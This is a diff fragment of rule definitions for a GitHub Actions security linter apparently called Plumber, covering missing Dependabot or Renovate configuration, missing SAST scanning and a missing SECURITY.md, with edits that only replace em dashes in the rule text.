         "The repository runs workflows but has no `.github/dependabot.yml`, no Renovate configuration, and no third-party equivalent.",
       impact:
-        "Manual upgrade flows leave known-vulnerable dependencies in CI for the longest possible time. Plumber's other rules surface vulnerable actions (ISSUE-703) and stale pins (ISSUE-709) — without an updater, you have no path to apply those updates routinely.",
+        "Manual upgrade flows leave known-vulnerable dependencies in CI for the longest possible time. Plumber's other rules surface vulnerable actions (ISSUE-703) and stale pins (ISSUE-709). Without an updater, you have no path to apply those updates routinely.",
       remediation:
         "Add `.github/dependabot.yml` with at least the `github-actions` ecosystem (cheap, high-signal). Add language ecosystems (`pip`, `npm`, `bundler`) as the repo's languages.",
-      badExample: `# .github/dependabot.yml — ❌ File missing entirely
+      badExample: `# .github/dependabot.yml: ❌ File missing entirely
 `,
       badExampleCaption: "Repo has workflows but no automation to bump action SHAs or language deps.",
-      goodExample: `# .github/dependabot.yml — ✅ Minimal start
+      goodExample: `# .github/dependabot.yml: ✅ Minimal start
 version: 2
 updates:
   - package-ecosystem: github-actions
@@ -4558,7 +4558,7 @@ updates:
       default-days: 7`,
       goodExampleCaption: "GitHub Actions + npm covered; weekly cadence with cooldown.",
       tips: [
-        "If you prefer Renovate, configure it via `renovate.json` — Plumber recognises both.",
+        "If you prefer Renovate, configure it via `renovate.json`; Plumber recognises both.",
         "`github-actions` ecosystem auto-bumps SHA pins (ISSUE-709) and version comments (ISSUE-708) for you.",
       ],
       status: "roadmap",
@@ -4582,12 +4582,12 @@ updates:
         "SAST in CI catches a meaningful fraction of pre-merge defects (auth bugs, injection patterns, unsafe deserialisation) for one of the lowest CI-minute costs available. Skipping it removes a cheap gate that ships value every week.",
       remediation:
         "Add a SAST job. GitHub's CodeQL is free for public repos and most plan tiers; Semgrep OSS is a free alternative on private repos.",
-      badExample: `# .github/workflows/ — ❌ Build + test only, no SAST
+      badExample: `# .github/workflows/: ❌ Build + test only, no SAST
 ci.yml         (build + lint)
 test.yml       (pytest)
 release.yml    (publish)`,
       badExampleCaption: "No SAST scanner anywhere in the workflows directory.",
-      goodExample: `# .github/workflows/codeql.yml — ✅ CodeQL on push + weekly
+      goodExample: `# .github/workflows/codeql.yml: ✅ CodeQL on push + weekly
 name: CodeQL
 on:
   push:
@@ -4611,7 +4611,7 @@ jobs:
       goodExampleCaption: "CodeQL runs on every push and weekly on a schedule.",
       tips: [
         "CodeQL supports Python, JavaScript/TypeScript, Java, Go, C/C++, C#, Ruby, Swift, Kotlin.",
-        "Plumber recognises `github/codeql-action`, `returntocorp/semgrep-action`, `snyk/actions/python`, etc. — extensible via config.",
+        "Plumber recognises `github/codeql-action`, `returntocorp/semgrep-action`, `snyk/actions/python`, etc. The list is extensible via config.",
       ],
       status: "roadmap",
       relatedCodes: ["ISSUE-410", "ISSUE-905"],
@@ -4631,17 +4631,17 @@ jobs:
       description:
         "The repository has workflows (suggesting it's an actively maintained project) but no `SECURITY.md` at the root, in `.github/`, or in `docs/`.",
       impact:
-        "A documented security policy tells reporters where to send vulnerability disclosures. Without it, reporters drop CVE-class issues into public GitHub Issues — turning a private heads-up into a zero-day.",
+        "A documented security policy tells reporters where to send vulnerability disclosures. Without it, reporters drop CVE-class issues into public GitHub Issues, turning a private heads-up into a zero-day.",
       remediation:
         "Add a `SECURITY.md` describing the supported versions and a private contact (security advisory link, email).",
-      badExample: `# Repository root — ❌ No security policy file anywhere
+      badExample: `# Repository root: ❌ No security policy file anywhere
 .github/
 src/
 README.md
 LICENSE
 # (no SECURITY.md)`,
       badExampleCaption: "External reporters have nowhere to file a private disclosure.",
-      goodExample: `# SECURITY.md — ✅ Clear disclosure path
+      goodExample: `# SECURITY.md: ✅ Clear disclosure path
 
 ## Reporting a vulnerability
 
